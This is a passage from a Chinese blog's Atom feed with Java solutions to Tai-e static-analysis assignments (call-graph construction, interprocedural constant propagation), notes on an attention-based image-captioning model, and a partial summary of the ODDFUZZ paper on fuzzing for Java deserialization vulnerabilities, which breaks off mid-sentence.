class="line">    <span class="type">JMethod</span> <span class="variable">m</span> <span class="operator">=</span> callSite.getMethodRef()</span><br><span class="line">        .getDeclaringClass()</span><br><span class="line">        .getDeclaredMethod(callSite.getMethodRef().getSubsignature());</span><br><span class="line">    <span class="keyword">assert</span> m != <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (callSite.isStatic()) &#123;</span><br><span class="line">        <span class="comment">// T = &#123;m&#125;</span></span><br><span class="line">        T.add(m);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (callSite.isSpecial()) &#123;</span><br><span class="line">        <span class="comment">// T = &#123;dispatch(c^m, m)&#125;</span></span><br><span class="line">        <span class="type">JClass</span> <span class="variable">c_m</span> <span class="operator">=</span> callSite.getMethodRef().getDeclaringClass();</span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">dispatch_ret</span> <span class="operator">=</span> dispatch(c_m, callSite.getMethodRef().getSubsignature());</span><br><span class="line">        <span class="keyword">if</span> (dispatch_ret != <span class="literal">null</span>) &#123;</span><br><span class="line">            T.add(dispatch_ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (callSite.isVirtual() || callSite.isInterface()) &#123;</span><br><span class="line">        <span class="comment">// isVirtual and isInterface is same process</span></span><br><span class="line">        <span class="comment">// T = &#123;dispatch(c&#x27;, m)&#125;</span></span><br><span class="line">        <span class="type">JClass</span> <span class="variable">c</span> <span class="operator">=</span> callSite.getMethodRef().getDeclaringClass();</span><br><span class="line">        Collection&lt;JClass&gt; c_sub = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();;</span><br><span class="line">        c_sub.add(c);</span><br><span class="line">        <span class="keyword">while</span> (!c_sub.isEmpty()) &#123;</span><br><span class="line">            Collection&lt;JClass&gt; c_sub_new = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (JClass c_sub_single: c_sub) &#123;</span><br><span class="line">                <span class="type">JMethod</span> <span class="variable">dispatch_re</span> <span class="operator">=</span> dispatch(c_sub_single, callSite.getMethodRef().getSubsignature());</span><br><span class="line">                <span class="keyword">if</span> (dispatch_re != <span class="literal">null</span>) &#123;</span><br><span class="line">                    T.add(dispatch_re);</span><br><span class="line">                &#125;</span><br><span class="line">                c_sub_new.addAll(hierarchy.getDirectSubclassesOf(c_sub_single));</span><br><span class="line">                c_sub_new.addAll(hierarchy.getDirectImplementorsOf(c_sub_single));</span><br><span class="line">                c_sub_new.addAll(hierarchy.getDirectSubinterfacesOf(c_sub_single));</span><br><span class="line">            &#125;</span><br><span class="line">            c_sub = c_sub_new;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;call type error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JMethod <span class="title function_">dispatch</span><span class="params">(JClass jclass, Subsignature subsignature)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (jclass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">m</span> <span class="operator">=</span> jclass.getDeclaredMethod(subsignature);</span><br><span class="line">        <span class="keyword">if</span> (m != <span class="literal">null</span> &amp;&amp; !m.isAbstract()) &#123;</span><br><span class="line">            <span class="comment">// dispatch(c, m) = m&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// dispatch(c, m) = dispatch(c&#x27;, m)</span></span><br><span class="line">            <span class="type">JClass</span> <span class="variable">super_class</span> <span class="operator">=</span> jclass.getSuperClass();</span><br><span class="line">            <span class="keyword">return</span> dispatch(super_class, subsignature);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InterConstantPropagation.java</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">transferCallNode</span><span class="params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;</span><br><span class="line">    <span class="comment">// Refer to https://github.com/MirageLyu/Tai-e-assignments/blob/main/A4/tai-e/src/main/java/pascal/taie/analysis/dataflow/inter/InterConstantPropagation.java</span></span><br><span class="line">    <span class="keyword">if</span> (!out.equals(in)) &#123;</span><br><span class="line">        out.copyFrom(in);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">transferNonCallNode</span><span class="params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> cp.transferNode(stmt, in, out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> CPFact <span class="title function_">transferNormalEdge</span><span class="params">(NormalEdge&lt;Stmt&gt; edge, CPFact out)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> out.copy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> CPFact <span class="title function_">transferCallToReturnEdge</span><span class="params">(CallToReturnEdge&lt;Stmt&gt; edge, CPFact out)</span> &#123;</span><br><span class="line">    <span class="type">CPFact</span> <span class="variable">result</span> <span class="operator">=</span> out.copy();</span><br><span class="line">    <span class="type">Stmt</span> <span class="variable">source</span> <span class="operator">=</span> edge.getSource();</span><br><span class="line">    Optional&lt;LValue&gt; v = source.getDef();</span><br><span class="line">    <span class="keyword">if</span> (v.isPresent()) &#123;</span><br><span class="line">        <span class="type">LValue</span> <span class="variable">vv</span> <span class="operator">=</span> v.get();</span><br><span class="line">        <span class="keyword">if</span> (vv <span class="keyword">instanceof</span> Var) &#123;</span><br><span class="line">            result.remove((Var)vv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> CPFact <span class="title function_">transferCallEdge</span><span class="params">(CallEdge&lt;Stmt&gt; edge, CPFact callSiteOut)</span> &#123;</span><br><span class="line">    <span class="comment">// transferEdge(2-&gt;4, &#123;a=6&#125;) = &#123;x=6&#125;</span></span><br><span class="line">    <span class="type">CPFact</span> <span class="variable">result</span> <span class="operator">=</span> newInitialFact();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// caller args</span></span><br><span class="line">    <span class="type">Stmt</span> <span class="variable">source</span> <span class="operator">=</span> edge.getSource();</span><br><span class="line">    <span class="keyword">assert</span> source <span class="keyword">instanceof</span> Invoke;</span><br><span class="line">    List&lt;Var&gt; args_source = ((Invoke)source).getInvokeExp().getArgs();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// callee args</span></span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">target</span> <span class="operator">=</span> edge.getCallee();</span><br><span class="line">    List&lt;Var&gt; args_target = target.getIR().getParams();</span><br><span class="line">    <span class="keyword">assert</span> args_target.size() == args_source.size();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pass caller args to callee args</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args_source.size(); i++) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">v</span> <span class="operator">=</span> args_source.get(i);</span><br><span class="line">        <span class="type">Value</span> <span class="variable">val</span> <span class="operator">=</span> callSiteOut.get(v);</span><br><span class="line">        result.update(args_target.get(i), val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> CPFact <span class="title function_">transferReturnEdge</span><span class="params">(ReturnEdge&lt;Stmt&gt; edge, CPFact returnOut)</span> &#123;</span><br><span class="line">    <span class="comment">// transferEdge(6-&gt;3, &#123;x=6,y=7&#125;) = &#123;b=7&#125;</span></span><br><span class="line">    <span class="type">CPFact</span> <span class="variable">result</span> <span class="operator">=</span> newInitialFact();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get Var to update</span></span><br><span class="line">    <span class="type">Stmt</span> <span class="variable">stmt</span> <span class="operator">=</span> edge.getCallSite();</span><br><span class="line">    <span class="type">Value</span> <span class="variable">val</span> <span class="operator">=</span> Value.getUndef();</span><br><span class="line">    <span class="keyword">for</span> (Var <span class="keyword">var</span> : edge.getReturnVars()) &#123;</span><br><span class="line">        val = cp.meetValue(val, returnOut.get(<span class="keyword">var</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> Invoke &amp;&amp; ((Invoke) stmt).getLValue() != <span class="literal">null</span>) &#123;</span><br><span class="line">        result.update(((Invoke) stmt).getLValue(), val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InterSolver.java</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// every entry in function should have boundaryfact, which conflict to PPT</span></span><br><span class="line">    icfg.entryMethods().forEach(entry_method -&gt; &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">entry_node</span> <span class="operator">=</span> icfg.getEntryOf(entry_method);</span><br><span class="line">        result.setInFact(entry_node, analysis.newBoundaryFact(entry_node));</span><br><span class="line">        result.setOutFact(entry_node, analysis.newBoundaryFact(entry_node));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    icfg.forEach(node -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (icfg.entryMethods().noneMatch(entry_method -&gt; node.equals(icfg.getEntryOf(entry_method)))) &#123;</span><br><span class="line">            result.setInFact(node, analysis.newInitialFact());</span><br><span class="line">            result.setOutFact(node, analysis.newInitialFact());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doSolve</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (Node n: icfg)</span><br><span class="line">        workList.offer(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!workList.isEmpty()) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">changed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// pick basic block B from Worklist</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> workList.poll();</span><br><span class="line">        <span class="comment">// IN[B] = UNION(transferEdge(OUT[P]))</span></span><br><span class="line">        <span class="type">Fact</span> <span class="variable">fact</span> <span class="operator">=</span> result.getInFact(cur);</span><br><span class="line">        <span class="keyword">for</span> (ICFGEdge&lt;Node&gt; pred: icfg.getInEdgesOf(cur)) &#123;</span><br><span class="line">            <span class="type">Fact</span> <span class="variable">tmp</span> <span class="operator">=</span> analysis.transferEdge(pred, result.getOutFact(pred.getSource()));</span><br><span class="line">            analysis.meetInto(tmp, fact);</span><br><span class="line">        &#125;</span><br><span class="line">        result.setInFact(cur, fact);</span><br><span class="line">        <span class="comment">// OUT[B] = genB UNION (IN[B]-killB)</span></span><br><span class="line">        <span class="type">Fact</span> <span class="variable">in_fact</span> <span class="operator">=</span> result.getInFact(cur);</span><br><span class="line">        <span class="type">Fact</span> <span class="variable">out_fact</span> <span class="operator">=</span> result.getOutFact(cur);</span><br><span class="line">        changed = analysis.transferNode(cur, in_fact, out_fact);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (changed)</span><br><span class="line">            <span class="keyword">for</span> (Node suc: icfg.getSuccsOf(cur))</span><br><span class="line">                <span class="keyword">if</span> (!workList.contains(suc))</span><br><span class="line">                    workList.offer(suc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;软件分析基础知识-amp-作业&quot;&gt;&lt;a href=&quot;#软件分析基础知识-amp-作业&quot; class=&quot;headerlink&quot; title=&quot;软件分析基础知识&amp;amp;作业&quot;&gt;&lt;/a&gt;软件分析基础知识&amp;amp;作业&lt;/h1&gt;&lt;p&gt;&amp;emsp;之前翔哥给我具体讲了讲软件分析的基础知识，翔哥的链接如下所示：&lt;/p&gt;
&lt;p&gt;[1] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-01&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-01&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-02&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-02&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-03&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-03&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-04&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-04&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[5] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-05&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-05&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="static-analysis" scheme="https://wd-2711.tech/categories/static-analysis/"/>
    
    
  </entry>
  
  <entry>
    <title>image-caption</title>
    <link href="https://wd-2711.tech/2023/11/09/image-caption/"/>
    <id>https://wd-2711.tech/2023/11/09/image-caption/</id>
    <published>2023-11-09T12:40:05.000Z</published>
    <updated>2023-12-18T12:26:06.315Z</updated>
    
    <content type="html"><![CDATA[<h1 id="image-caption-图像中文描述"><a href="#image-caption-图像中文描述" class="headerlink" title="image-caption: 图像中文描述"></a>image-caption: 图像中文描述</h1><p>数据集下载：<a href="https://tianchi.aliyun.com/dataset/145781?t=1699533627520">https://tianchi.aliyun.com/dataset/145781?t=1699533627520</a></p><span id="more"></span><h2 id="Show-Attend-and-Tell"><a href="#Show-Attend-and-Tell" class="headerlink" title="Show, Attend, and Tell"></a>Show, Attend, and Tell</h2><p>&emsp;这是一篇2021年的文章，用于生成图像的描述。利用卷积神经网络CNN提取图像特征，使用RNN将特征向量解码成语言序列。本论文在RNN（LSTM）上加入了attention机制，对图像特征的像素点进行概率估计，并加权求和，其思想为：人们在观察图像中倾向于关注有用信息。</p><p>&emsp;此文的贡献是：（1）提出了基于attention的image caption；（2）可视化了attention在每个时间上关注的点；（3）量化了加入attention机制后性能的提高。</p><h3 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h3><p>&emsp;VGGNet、Inception等是在大规模图像数据集（如ImageNet）上进行了预训练的模型，可以很好的提取到图像的特征。通过将最后的flatten与FC去掉，可以得到特征图。</p><h3 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h3><p>&emsp;使用LSTM，在每个时间step上生成词语。</p><p>&emsp;复习一下LSTM的知识：</p><p><img src="/images/image-caption/image-20231130205705945.png" alt="image-20231130205705945" style="zoom:67%;" /></p><p>&emsp;LSTM的输入为：$C<em>{t-1},h</em>{t-1},x_{t}$，输出为$C_t,h_t$。</p><p>&emsp;遗忘门：</p><p><img src="/images/image-caption/image-20231130205921504.png" alt="image-20231130205921504" style="zoom:67%;" /></p><p>&emsp;输出门（存储并更新细胞状态）：</p><p><img src="/images/image-caption/image-20231130205950447.png" alt="image-20231130205950447" style="zoom:67%;" /></p><p><img src="/images/image-caption/image-20231130205959664.png" alt="image-20231130205959664" style="zoom:67%;" /></p><p>&emsp;输出门：</p><p><img src="/images/image-caption/image-20231130210149692.png" alt="image-20231130210149692" style="zoom:67%;" /></p><p><img src="/images/image-caption/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(1).png" alt="未命名文件 (1)" style="zoom:67%;" /></p><h3 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h3><p>&emsp;作用是帮助生成LSTM中的$C<em>t$。利用CNN提取出的特征向量$a$与LSTM输出的$h</em>{t-1}$，通过FC+softmax计算每个像素点的概率值，之后对每个像素点加权求和，具体看下图。</p><p><img src="/images/image-caption/image-20231130220806283.png" alt="image-20231130220806283" style="zoom:80%;" /></p><p>To be continued…</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>[1] <a href="https://github.com/foamliu/Image-Captioning-PyTorch">https://github.com/foamliu/Image-Captioning-PyTorch</a></p><p>[2] <a href="https://blog.csdn.net/qq_43152622/article/details/118755946">https://blog.csdn.net/qq_43152622/article/details/118755946</a></p><p>[3] <a href="https://github.com/dabasajay/Image-Caption-Generator">https://github.com/dabasajay/Image-Caption-Generator</a></p><p>[4] <a href="https://blog.csdn.net/sophicchen/article/details/103306545">https://blog.csdn.net/sophicchen/article/details/103306545</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;image-caption-图像中文描述&quot;&gt;&lt;a href=&quot;#image-caption-图像中文描述&quot; class=&quot;headerlink&quot; title=&quot;image-caption: 图像中文描述&quot;&gt;&lt;/a&gt;image-caption: 图像中文描述&lt;/h1&gt;&lt;p&gt;数据集下载：&lt;a href=&quot;https://tianchi.aliyun.com/dataset/145781?t=1699533627520&quot;&gt;https://tianchi.aliyun.com/dataset/145781?t=1699533627520&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ML" scheme="https://wd-2711.tech/categories/ML/"/>
    
    
  </entry>
  
  <entry>
    <title>oddfuzz</title>
    <link href="https://wd-2711.tech/2023/11/07/oddfuzz/"/>
    <id>https://wd-2711.tech/2023/11/07/oddfuzz/</id>
    <published>2023-11-07T12:15:44.000Z</published>
    <updated>2023-11-29T14:51:26.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing"><a href="#ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing" class="headerlink" title="ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing"></a>ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>&emsp;可以用静态分析来定位java反序列化漏洞。ODDFUZZ使用轻量级污点分析定位候选的gadget链（避免漏报），之后使用定向灰盒测试生成poc用例来减少误报。ODDFUZZ使用结构感知种子生成方法保证用例有效性，并使用混合反馈与步进策略来指导定向模糊测试。</p><span id="more"></span><p>&emsp;找到ysoserial库34个漏洞中的16个（baseline 为3个），并在其他库中找到6个CVE。</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;开放动态反序列化 OOD 具有破坏性（？），通过静态分析查找反序列化漏洞的工具有：（1）GadgetInspector，但是会有精度问题，从而产生漏报与误报；（2）SerHybrid，分析堆访问路径来寻找影响 sink 的 source。</p><p>&emsp;挑战：（1）精确率与召回率之间的权衡。由于java的运行时多态，任何重写的方法都可能变为gadget链，遍历所有可能的gadget链会使得路径爆炸，现有方法是使用污点分析剪枝，但是这种方法要么精度不行，要么计算代价太高。（2）现有fuzz生成的testcase都无法到达sink，生成有效的testcase需要多层级结构、且属性满足特定控制流约束。（3）现有方案以代码覆盖率为导向，而不是以目标为导向，就会浪费很多资源去找无法到达sink的path。</p><p>&emsp;ODDFUZZ贡献：（1）处理运行时多态时，对准确率与召回率之间进行权衡；（2）建模gadget链的数据约束，进行结构感知的fuzz；（3）使用step-forword策略与hybrid feedback，快速找到漏洞。</p><p>&emsp;使用java fuzz框架JQF来写ODDFUZZ。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="ODD"><a href="#ODD" class="headerlink" title="ODD"></a>ODD</h3><p>&emsp;开源动态反序列化ODD，又叫做对象注入漏洞OIV，指的是攻击者将序列化对象注入到应用程序的行为。ODD漏洞在js、php、.NET中也会有。open表示任意对象都可以被反序列化，dynamic表示能够调用invoke多态方法或基于反射的行为去找寻路径。由于java是动态的，所以很难预测会invoke哪个方法。攻击者可将应用程序的代码片段链接在一起（并按顺序执行它们）并将数据传递到安全敏感的调用点，攻击就成功。gadget链实例如下所示：</p><p><img src="/images/oddfuzz/image-20231108211644048.png" alt="image-20231108211644048" style="zoom:67%;" /></p><p>&emsp;面向属性的编程POP。精细的定义要反序列化的属性，以链接不同级别的对象，从而进行成功的攻击。下图是对上图的POP编程，通过构造的PriorityQueue，最后可进行代码的远程执行。</p><p><img src="/images/oddfuzz/image-20231108213655198.png" alt="image-20231108213655198" style="zoom:67%;" /></p><h3 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h3><p><img src="/images/oddfuzz/image-20231108213822316.png" alt="image-20231108213822316" style="zoom:67%;" /></p><h3 id="定向灰盒测试-DGF"><a href="#定向灰盒测试-DGF" class="headerlink" title="定向灰盒测试 DGF"></a>定向灰盒测试 DGF</h3><p>&emsp;以代码覆盖率为导向的灰盒测试（CGF）与定向灰盒测试（DGF）。对于某些场景，静态报告验证，漏洞就在那儿了，需要自己探索。DGF引导fuzzer到特定位置，并生成POC testcase。以下是DGF的流程：</p><p><img src="/images/oddfuzz/image-20231108214859002.png" alt="image-20231108214859002" style="zoom:67%;" /></p><p>&emsp;（1）静态分析阶段：提取调用图与控制流图，计算二进制文件与目标之间的距离。（2）fuzzing循环阶段，目标距离、覆盖率、相似性作为反馈信息，以快速引导fuzzer到达目标点。利用反馈信息，fuzzer在seed pool中选择seed，并分配适合的能量进行变异。seed的能量确定生成多少新种子。fuzzer使用多种变异策略来引导种子向目标站点进化。具有更小距离的新种子将被保留，以进行下一次fuzzing循环。</p><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><h3 id="挑战1：运行时多态"><a href="#挑战1：运行时多态" class="headerlink" title="挑战1：运行时多态"></a>挑战1：运行时多态</h3><p>&emsp;现有的工作可以识别代码中gadget的组合，攻击者使用gadget来组合gadget链。由于运行时多态，无法根据声明类型确定虚拟方法调用，因此，无法精确找到运行时的程序路径，从而导致高漏报。解决此问题的方法是进行类层次分析（CHA），综合考虑显式与隐式方法调用，但是盲目的考虑所有可行的gadget会导致路径爆炸问题。</p><p>&emsp;gadgetInspector分别追踪了<code>函数参数</code>到<code>返回值、其他方法调用</code>的数据流，并列举了<code>基于类继承层次结构的所有可用方法</code>与<code>gadget链的相关函数重写</code>。然而，攻击者可控制的属性能够<code>从污点参数传播到其子类的参数</code>，这类情况gadgetInspector没有考虑，即没有考虑<code>过程内污点分析</code>。</p><p>&emsp;FUGIO在其构建的<code>深度有界调用树上追踪了过程内数据流</code>，以对不可行的gadget进行剪枝。然而，进行java ODD（开源动态反序列化）调用链发现时，这种方法不管用，这是因为传统java程序会集成很多个具有各自依赖关系的库，这会导致很多类和方法，使得调用链很深很宽，难以处理。</p><p><img src="/images/oddfuzz/image-20231109214851761.png" alt="image-20231109214851761" style="zoom:67%;" /></p><h3 id="挑战2：结构化的输入构建"><a href="#挑战2：结构化的输入构建" class="headerlink" title="挑战2：结构化的输入构建"></a>挑战2：结构化的输入构建</h3><p>&emsp;注入的对象一般都是由多个子对象构成的，通过POP编程，要求构造的对象在语法上可以反序列化，在语义上要满足一定的控制与数据流约束，从而使得gadget链可以实现有效的fuzz输入。如果没有复杂嵌套形式的对象结构的先验知识，那么很难构造出合适的fuzz case。</p><p><img src="/images/oddfuzz/image-20231111105100799.png" alt="image-20231111105100799" style="zoom:67%;" /></p><p>&emsp;一种方法是generation-based fuzz技术。SerHybrid执行points-to分析，以产生堆访问路径，该路径可以到达安全敏感点。对堆访问路径中未出现的字段属性分配随机值，以生成有效的注入对象，然后执行。然而，随着可用gadget链的增加，fuzzer不知道注入对象的多级类层次结构，因此很难对属性分配正确的值。例如，很难从Comparator的多种实现中选取适合的TransformingComparator。FUGIO基于候选的链生成了属性树，并通过启发式规则突变属性。但是，任意子类的随机组合语义上可能是无效的。</p><h3 id="挑战3：目标定向模糊测试"><a href="#挑战3：目标定向模糊测试" class="headerlink" title="挑战3：目标定向模糊测试"></a>挑战3：目标定向模糊测试</h3><p>&emsp;由于gadget链是由攻击者可控的方法组成的，这些方法在对象反序列化期间自动执行。常规代码覆盖率无法指导fuzzer，因为trigger很多code片段可能也无法到达sink点。</p><p>&emsp;本文没有追求最大的代码覆盖率，而是使用定向灰盒测试DGF来优先考虑接近sink的seed。之前的定向灰盒测试器计算种子执行轨迹上所有基本块距离的算数平均值，来调度种子，以快速达到sink。其问题是，种子距离是可能有偏差的，并且种子执行路径可能没有像想象中那样朝sink运行，对注入对象属性的修改可能会使执行路径发生巨大变化。因此，目标定向fuzz的feedback是很重要的。</p><h2 id="ODDFUZZ-设计"><a href="#ODDFUZZ-设计" class="headerlink" title="ODDFUZZ 设计"></a>ODDFUZZ 设计</h2><p><img src="/images/oddfuzz/image-20231114195459925.png" alt="image-20231114195459925" style="zoom:67%;" /></p><h3 id="A-总览"><a href="#A-总览" class="headerlink" title="A. 总览"></a>A. 总览</h3><p>&emsp;上图的program代表jar、war、class file，将其作为输入，并使用轻量级污点分析自动识别所有潜在的gadget链。之后，基于潜在的gadget链，生成结构感知的seed，以生成语义上有效的fuzz注入对象。在fuzzing loop阶段，oddfuzz结合前向突变策略与混合反馈（seed距离与gadget覆盖率）去引导fuzzer将注入对象突变，并到达sink。</p><h3 id="B-污点分析"><a href="#B-污点分析" class="headerlink" title="B. 污点分析"></a>B. 污点分析</h3><p>&emsp;如果有可利用的gadget链，那么进行污点分析，一定能从source到达sink。可以构建call 